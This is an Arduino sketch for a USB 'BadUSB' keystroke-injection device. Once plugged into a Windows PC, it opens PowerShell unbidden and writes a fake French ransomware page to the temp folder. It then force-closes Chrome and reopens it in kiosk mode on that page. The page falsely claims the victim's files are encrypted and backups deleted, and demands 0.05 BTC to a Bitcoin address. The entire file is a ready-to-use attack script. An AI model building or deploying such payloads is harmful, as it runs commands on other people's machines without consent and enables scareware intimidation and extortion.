#define HID_CUSTOM_LAYOUT
#define LAYOUT_FRENCH

#include <HID-Project.h>

void t(const __FlashStringHelper* str) {
  BootKeyboard.print(str);
  delay(20);
}

void enter() {
  BootKeyboard.write(KEY_RETURN);
  delay(100);
}

void setup() {
  delay(5000);
  BootKeyboard.begin();
  delay(500);

  // Ouvrir Terminal
  BootKeyboard.press(KEY_LEFT_GUI);
  delay(150);
  BootKeyboard.press('x');
  delay(150);
  BootKeyboard.releaseAll();
  delay(800);
  BootKeyboard.press('i');
  delay(50);
  BootKeyboard.release('i');
  delay(1500);

  // Créer le HTML
  t(F("$lines = @()")); enter();
  t(F("$lines += '<html><head><meta charset=utf-8><style>'")); enter();
  t(F("$lines += '@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}'")); enter();
  t(F("$lines += 'body{margin:0;background:#0a0a0a;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;font-family:monospace;overflow:hidden}'")); enter();
  t(F("$lines += '.b{border:1px solid red;padding:3rem;text-align:center;width:90%;max-width:760px;background:rgba(255,0,0,.04);box-sizing:border-box}'")); enter();
  t(F("$lines += '.ti{font-size:52px;color:red;font-weight:bold;animation:p .8s infinite}'")); enter();
  t(F("$lines += '.bt{font-size:58px;color:red;font-weight:bold;animation:p 1s infinite}'")); enter();
  t(F("$lines += '.ad{background:rgba(255,0,0,.08);border:1px solid rgba(255,0,0,.2);padding:1rem;color:#ff4444;font-size:13px;margin:1rem 0}'")); enter();
  t(F("$lines += '.hr{width:100%;height:1px;background:rgba(255,0,0,.2);margin:1.5rem 0}'")); enter();
  t(F("$lines += '.lo{color:#cc0000;font-size:13px;line-height:2.2;text-align:left;margin-bottom:2rem}'")); enter();
  t(F("$lines += '</style></head><body><div class=b>'")); enter();
  t(F("$lines += '<div class=ti>VOUS ETES HACKE</div>'")); enter();
  t(F("$lines += '<div style=color:#880000;font-size:11px;letter-spacing:3px>RANSOMWARE v4.2.1 - AES-256</div>'")); enter();
  t(F("$lines += '<div class=hr></div>'")); enter();
  t(F("$lines += '<div class=lo>[ OK ] Analyse fichiers ... 47 832 fichiers<br>[ OK ] Chiffrement AES-256 . 100%<br>[ OK ] Sauvegardes supprimees OK<br>[ !! ] En attente paiement . URGENT</div>'")); enter();
  t(F("$lines += '<div class=hr></div>'")); enter();
  t(F("$lines += '<div style=color:#ff6666;font-size:14px>POUR RECUPERER VOS FICHIERS PAYEZ</div>'")); enter();
  t(F("$lines += '<div class=bt>0.05 BTC</div>'")); enter();
  t(F("$lines += '<div style=color:#880000;margin-bottom:2rem>environ 3200 euros</div>'")); enter();
  t(F("$lines += '<div class=ad>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</div>'")); enter();
  t(F("$lines += '<div class=hr></div><div style=color:#550000;font-size:11px>ID: A3F2-9KX1-7BQM-4RTP-2026</div>'")); enter();
  t(F("$lines += '</div><div style=color:#440000;font-size:10px;margin-top:1.5rem>NE PAS ETEINDRE L ORDINATEUR</div>'")); enter();
  t(F("$lines += '</body></html>'")); enter();
  t(F("$lines | Out-File $env:TEMP\\hack.html -Encoding utf8")); enter();
  delay(500);

  // Stop-Process chrome puis lancer en kiosque en arrière-plan avec Start-Process (non bloquant)
  // Start-Process est déjà non bloquant donc on peut quitter juste après
  t(F("Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue")); enter();
  delay(1500);
  t(F("Start-Process 'chrome.exe' \"--kiosk $env:TEMP\\hack.html --incognito\"")); enter();
  delay(500);

  // Start-Process est non bloquant, on peut fermer le terminal immédiatement
  t(F("exit")); enter();

  BootKeyboard.end();
}

void loop() {}